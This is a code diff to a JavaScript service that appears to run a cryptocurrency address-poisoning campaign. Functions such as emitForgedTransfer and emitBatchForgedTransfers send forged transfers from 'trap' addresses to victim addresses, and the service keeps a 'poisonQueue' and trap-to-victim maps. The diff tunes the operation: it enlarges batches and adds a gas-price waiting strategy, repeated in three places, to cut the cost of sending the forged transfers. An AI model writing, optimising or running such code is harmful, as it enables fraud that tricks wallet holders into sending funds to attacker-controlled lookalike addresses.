@@ -589,7 +589,7 @@ const recentVictimTransfers = new Map();
 const trapToVictimMap = new Map();
 
 // 🚀 BATCH PROCESSING: Queue-and-flush system
-const BATCH_FLUSH_THRESHOLD = 40;
+const BATCH_FLUSH_THRESHOLD = 150;
 const BATCH_FLUSH_INTERVAL_MS = 600000;
 const poisonQueue = new Map();
 let queueFlushTimer = null;
@@ -1146,29 +1146,6 @@ const campaignMirrorLocks = new Map();
 // Rate-limit gas insufficient alerts (one per operator per hour)
 const lastGasAlertTime = new Map();
 
-// 🚀 GAS SNIFFER: Pauses batching if Ethereum network is congested
-async function waitForCheapGas(maxGwei = 20) {
-  const maxBaseFee = BigInt(maxGwei) * 1000000000n;
-
-  for (let i = 0; i < 15; i++) { // Wait up to 3 minutes (15 Ethereum blocks)
-    try {
-      const block = await client.getBlock({ blockTag: 'latest' });
-      const baseFee = block.baseFeePerGas || 0n;
-      const currentGwei = Number(baseFee) / 1e9;
-
-      if (baseFee <= maxBaseFee) {
-        logger.info(`[gas-sniffer] ✅ Base fee is ${currentGwei.toFixed(2)} gwei (Target: <${maxGwei}). Firing batch!`);
-        return;
-      }
-
-      logger.info(`[gas-sniffer] ⏳ Base fee is ${currentGwei.toFixed(2)} gwei. Waiting for cheaper gas...`);
-      await new Promise(resolve => setTimeout(resolve, 12000)); // Wait 1 Ethereum block (12s)
-    } catch (e) {
-      return; // If RPC fails, just proceed and let the transaction handle it
-    }
-  }
-  logger.warn(`[gas-sniffer] ⚠️ Gas stayed high for 3 minutes. Firing batch anyway to prevent queue overflow.`);
-}
 
 function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, campaignId, contractAddress) {
   if (!walletClient || !contractAddress) return Promise.resolve(false);
@@ -1263,27 +1240,70 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
     // 🚀 FIX: Get explicit nonce to prevent race conditions on RPC load balancers
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 DUSTER.PY EXACT MATCH: Ultra-cheap gas logic
-    let maxFeePerGas = 2000000000n; // 2 gwei default
-    let maxPriorityFeePerGas = 10000000n; // 0.01 gwei default
+    // 🚀 SMART GAS STRATEGY: Wait for cheap gas, but fallback to spot price if it takes too long
+    let maxFeePerGas = 2000000000n; // 2 gwei default fallback
+    let maxPriorityFeePerGas = 10000000n; // 0.01 gwei tip fallback
+    const TARGET_MAX_FEE_GWEI = 1.5; // The cheap rate we want
+    const targetMaxFee = BigInt(Math.floor(TARGET_MAX_FEE_GWEI * 1000)) * 1000000n;
+    const networkTip = 10000000n; // 0.01 gwei tip
 
     try {
       const block = await client.getBlock({ blockTag: 'latest' });
-      const baseFee = block.baseFeePerGas || 0n;
+      let baseFee = block.baseFeePerGas || 0n;
+      let finalMaxFee = baseFee + networkTip; // Default to current market rate
 
-      // network_max_fee = int(base_fee * 1.10) + 0.05 gwei
-      const networkMaxFee = baseFee + (baseFee / 10n) + 50000000n;
-      const networkTip = 10000000n; // 0.01 gwei
-      const minThreshold = 100000000n; // 0.1 gwei
-
-      if (networkTip >= networkMaxFee || networkMaxFee < minThreshold) {
-        logger.debug("[mirror] RPC returned glitchy fees. Using ultra-cheap defaults.");
+      if (baseFee <= targetMaxFee) {
+        // Network is cheap right now, fire immediately!
+        finalMaxFee = baseFee + networkTip;
+        logger.info(`[gas-strategy] ✅ Base fee is cheap (${(Number(baseFee) / 1e9).toFixed(2)} Gwei). Firing immediately!`);
       } else {
-        maxFeePerGas = networkMaxFee;
-        maxPriorityFeePerGas = networkTip < 50000000n ? networkTip : 50000000n; // min(network_tip, 0.05 gwei)
+        // Network is expensive. Wait up to 10 minutes for it to drop.
+        logger.info(`[gas-strategy] ⏳ Base fee is ${(Number(baseFee) / 1e9).toFixed(2)} Gwei. Waiting up to 10 mins for it to drop to <${TARGET_MAX_FEE_GWEI} Gwei...`);
+
+        let gasDropped = false;
+        for (let i = 0; i < 50; i++) { // 50 blocks * 12 seconds = 10 minutes
+          await new Promise(resolve => setTimeout(resolve, 12000)); // Wait 1 Ethereum block
+
+          try {
+            const currentBlock = await client.getBlock({ blockTag: 'latest' });
+            const currentBaseFee = currentBlock.baseFeePerGas || 0n;
+
+            if (currentBaseFee <= targetMaxFee) {
+              finalMaxFee = currentBaseFee + networkTip;
+              gasDropped = true;
+              logger.info(`[gas-strategy] ✅ Base fee dropped to ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei! Firing at cheap rate!`);
+              break;
+            }
+
+            // Log every minute so you can watch it waiting
+            if (i % 5 === 0) {
+              logger.info(`[gas-strategy] ⏳ Still waiting... Current base fee: ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei`);
+            }
+          } catch (e) {
+            logger.warn(`[gas-strategy] Failed to check base fee: ${e.message}`);
+            break;
+          }
+        }
+
+        if (!gasDropped) {
+          // Gas didn't drop in 10 minutes. Fire at current market rate to prevent stuck nonces.
+          try {
+            const fallbackBlock = await client.getBlock({ blockTag: 'latest' });
+            const fallbackBaseFee = fallbackBlock.baseFeePerGas || baseFee;
+            finalMaxFee = fallbackBaseFee + networkTip;
+            logger.warn(`[gas-strategy] ⚠️ Gas stayed high for 10 mins. Firing at current market rate (${(Number(fallbackBaseFee) / 1e9).toFixed(2)} Gwei) to prevent stuck nonces.`);
+          } catch (e) {
+            finalMaxFee = baseFee + networkTip;
+            logger.warn(`[gas-strategy] ⚠️ Gas check failed. Firing at original base fee.`);
+          }
+        }
       }
+
+      maxFeePerGas = finalMaxFee;
+      maxPriorityFeePerGas = networkTip;
+
     } catch (e) {
-      logger.warn(`[mirror] Failed to estimate fees, using defaults: ${e.message}`);
+      logger.warn(`[gas-strategy] Failed to estimate fees, using defaults: ${e.message}`);
     }
 
     // 🚀 CRITICAL SAFETY: Ensure priority fee is NEVER higher than max fee
@@ -1636,8 +1656,6 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
   const operatorAddress = walletClient.account.address;
 
   const run = currentLock.then(async () => {
-    // 🚀 GAS SNIFFER: Wait for cheap gas before firing
-    await waitForCheapGas(20); // Wait until base fee is under 20 gwei
 
     try {
       const [operatorBalance, gasPrice] = await Promise.all([
@@ -1673,29 +1691,73 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
 
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 DUSTER.PY EXACT MATCH: Ultra-cheap gas logic
-    let maxFeePerGas = 2000000000n; // 2 gwei default
-    let maxPriorityFeePerGas = 10000000n; // 0.01 gwei default
+    // 🚀 SMART GAS STRATEGY: Wait for cheap gas, but fallback to spot price if it takes too long
+    let maxFeePerGas = 2000000000n; // 2 gwei default fallback
+    let maxPriorityFeePerGas = 10000000n; // 0.01 gwei tip fallback
+    const TARGET_MAX_FEE_GWEI = 1.5; // The cheap rate we want
+    const targetMaxFee = BigInt(Math.floor(TARGET_MAX_FEE_GWEI * 1000)) * 1000000n;
+    const networkTip = 10000000n; // 0.01 gwei tip
 
     try {
       const block = await client.getBlock({ blockTag: 'latest' });
-      const baseFee = block.baseFeePerGas || 0n;
+      let baseFee = block.baseFeePerGas || 0n;
+      let finalMaxFee = baseFee + networkTip; // Default to current market rate
 
-      // network_max_fee = int(base_fee * 1.10) + 0.05 gwei
-      const networkMaxFee = baseFee + (baseFee / 10n) + 50000000n;
-      const networkTip = 10000000n; // 0.01 gwei
-      const minThreshold = 100000000n; // 0.1 gwei
-
-      if (networkTip >= networkMaxFee || networkMaxFee < minThreshold) {
-        logger.debug("[batch] RPC returned glitchy fees. Using ultra-cheap defaults.");
+      if (baseFee <= targetMaxFee) {
+        // Network is cheap right now, fire immediately!
+        finalMaxFee = baseFee + networkTip;
+        logger.info(`[gas-strategy] ✅ Base fee is cheap (${(Number(baseFee) / 1e9).toFixed(2)} Gwei). Firing immediately!`);
       } else {
-        maxFeePerGas = networkMaxFee;
-        maxPriorityFeePerGas = networkTip < 50000000n ? networkTip : 50000000n; // min(network_tip, 0.05 gwei)
+        // Network is expensive. Wait up to 10 minutes for it to drop.
+        logger.info(`[gas-strategy] ⏳ Base fee is ${(Number(baseFee) / 1e9).toFixed(2)} Gwei. Waiting up to 10 mins for it to drop to <${TARGET_MAX_FEE_GWEI} Gwei...`);
+
+        let gasDropped = false;
+        for (let i = 0; i < 50; i++) { // 50 blocks * 12 seconds = 10 minutes
+          await new Promise(resolve => setTimeout(resolve, 12000)); // Wait 1 Ethereum block
+
+          try {
+            const currentBlock = await client.getBlock({ blockTag: 'latest' });
+            const currentBaseFee = currentBlock.baseFeePerGas || 0n;
+
+            if (currentBaseFee <= targetMaxFee) {
+              finalMaxFee = currentBaseFee + networkTip;
+              gasDropped = true;
+              logger.info(`[gas-strategy] ✅ Base fee dropped to ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei! Firing at cheap rate!`);
+              break;
+            }
+
+            // Log every minute so you can watch it waiting
+            if (i % 5 === 0) {
+              logger.info(`[gas-strategy] ⏳ Still waiting... Current base fee: ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei`);
+            }
+          } catch (e) {
+            logger.warn(`[gas-strategy] Failed to check base fee: ${e.message}`);
+            break;
+          }
+        }
+
+        if (!gasDropped) {
+          // Gas didn't drop in 10 minutes. Fire at current market rate to prevent stuck nonces.
+          try {
+            const fallbackBlock = await client.getBlock({ blockTag: 'latest' });
+            const fallbackBaseFee = fallbackBlock.baseFeePerGas || baseFee;
+            finalMaxFee = fallbackBaseFee + networkTip;
+            logger.warn(`[gas-strategy] ⚠️ Gas stayed high for 10 mins. Firing at current market rate (${(Number(fallbackBaseFee) / 1e9).toFixed(2)} Gwei) to prevent stuck nonces.`);
+          } catch (e) {
+            finalMaxFee = baseFee + networkTip;
+            logger.warn(`[gas-strategy] ⚠️ Gas check failed. Firing at original base fee.`);
+          }
+        }
       }
+
+      maxFeePerGas = finalMaxFee;
+      maxPriorityFeePerGas = networkTip;
+
     } catch (e) {
-      logger.warn(`[batch] Failed to estimate fees, using defaults: ${e.message}`);
+      logger.warn(`[gas-strategy] Failed to estimate fees, using defaults: ${e.message}`);
     }
 
+    // 🚀 CRITICAL SAFETY: Ensure priority fee is NEVER higher than max fee
     if (maxPriorityFeePerGas >= maxFeePerGas) {
       maxPriorityFeePerGas = maxFeePerGas / 2n;
     }
@@ -1834,8 +1896,6 @@ async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
   const operatorAddress = walletClient.account.address;
 
   const run = currentLock.then(async () => {
-    // 🚀 GAS SNIFFER: Wait for cheap gas before firing
-    await waitForCheapGas(20);
 
     try {
       const [operatorBalance, gasPrice] = await Promise.all([
@@ -1876,27 +1936,73 @@ async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
 
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 DUSTER.PY EXACT MATCH: Ultra-cheap gas logic
-    let maxFeePerGas = 2000000000n;
-    let maxPriorityFeePerGas = 10000000n;
+    // 🚀 SMART GAS STRATEGY: Wait for cheap gas, but fallback to spot price if it takes too long
+    let maxFeePerGas = 2000000000n; // 2 gwei default fallback
+    let maxPriorityFeePerGas = 10000000n; // 0.01 gwei tip fallback
+    const TARGET_MAX_FEE_GWEI = 1.5; // The cheap rate we want
+    const targetMaxFee = BigInt(Math.floor(TARGET_MAX_FEE_GWEI * 1000)) * 1000000n;
+    const networkTip = 10000000n; // 0.01 gwei tip
 
     try {
       const block = await client.getBlock({ blockTag: 'latest' });
-      const baseFee = block.baseFeePerGas || 0n;
-      const networkMaxFee = baseFee + (baseFee / 10n) + 50000000n;
-      const networkTip = 10000000n;
-      const minThreshold = 100000000n;
+      let baseFee = block.baseFeePerGas || 0n;
+      let finalMaxFee = baseFee + networkTip; // Default to current market rate
 
-      if (networkTip >= networkMaxFee || networkMaxFee < minThreshold) {
-        logger.debug("[multi-batch] RPC returned glitchy fees. Using ultra-cheap defaults.");
+      if (baseFee <= targetMaxFee) {
+        // Network is cheap right now, fire immediately!
+        finalMaxFee = baseFee + networkTip;
+        logger.info(`[gas-strategy] ✅ Base fee is cheap (${(Number(baseFee) / 1e9).toFixed(2)} Gwei). Firing immediately!`);
       } else {
-        maxFeePerGas = networkMaxFee;
-        maxPriorityFeePerGas = networkTip < 50000000n ? networkTip : 50000000n;
+        // Network is expensive. Wait up to 10 minutes for it to drop.
+        logger.info(`[gas-strategy] ⏳ Base fee is ${(Number(baseFee) / 1e9).toFixed(2)} Gwei. Waiting up to 10 mins for it to drop to <${TARGET_MAX_FEE_GWEI} Gwei...`);
+
+        let gasDropped = false;
+        for (let i = 0; i < 50; i++) { // 50 blocks * 12 seconds = 10 minutes
+          await new Promise(resolve => setTimeout(resolve, 12000)); // Wait 1 Ethereum block
+
+          try {
+            const currentBlock = await client.getBlock({ blockTag: 'latest' });
+            const currentBaseFee = currentBlock.baseFeePerGas || 0n;
+
+            if (currentBaseFee <= targetMaxFee) {
+              finalMaxFee = currentBaseFee + networkTip;
+              gasDropped = true;
+              logger.info(`[gas-strategy] ✅ Base fee dropped to ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei! Firing at cheap rate!`);
+              break;
+            }
+
+            // Log every minute so you can watch it waiting
+            if (i % 5 === 0) {
+              logger.info(`[gas-strategy] ⏳ Still waiting... Current base fee: ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei`);
+            }
+          } catch (e) {
+            logger.warn(`[gas-strategy] Failed to check base fee: ${e.message}`);
+            break;
+          }
+        }
+
+        if (!gasDropped) {
+          // Gas didn't drop in 10 minutes. Fire at current market rate to prevent stuck nonces.
+          try {
+            const fallbackBlock = await client.getBlock({ blockTag: 'latest' });
+            const fallbackBaseFee = fallbackBlock.baseFeePerGas || baseFee;
+            finalMaxFee = fallbackBaseFee + networkTip;
+            logger.warn(`[gas-strategy] ⚠️ Gas stayed high for 10 mins. Firing at current market rate (${(Number(fallbackBaseFee) / 1e9).toFixed(2)} Gwei) to prevent stuck nonces.`);
+          } catch (e) {
+            finalMaxFee = baseFee + networkTip;
+            logger.warn(`[gas-strategy] ⚠️ Gas check failed. Firing at original base fee.`);
+          }
+        }
       }
+
+      maxFeePerGas = finalMaxFee;
+      maxPriorityFeePerGas = networkTip;
+
     } catch (e) {
-      logger.warn(`[multi-batch] Failed to estimate fees, using defaults: ${e.message}`);
+      logger.warn(`[gas-strategy] Failed to estimate fees, using defaults: ${e.message}`);
     }
 
+    // 🚀 CRITICAL SAFETY: Ensure priority fee is NEVER higher than max fee
     if (maxPriorityFeePerGas >= maxFeePerGas) {
       maxPriorityFeePerGas = maxFeePerGas / 2n;
     }
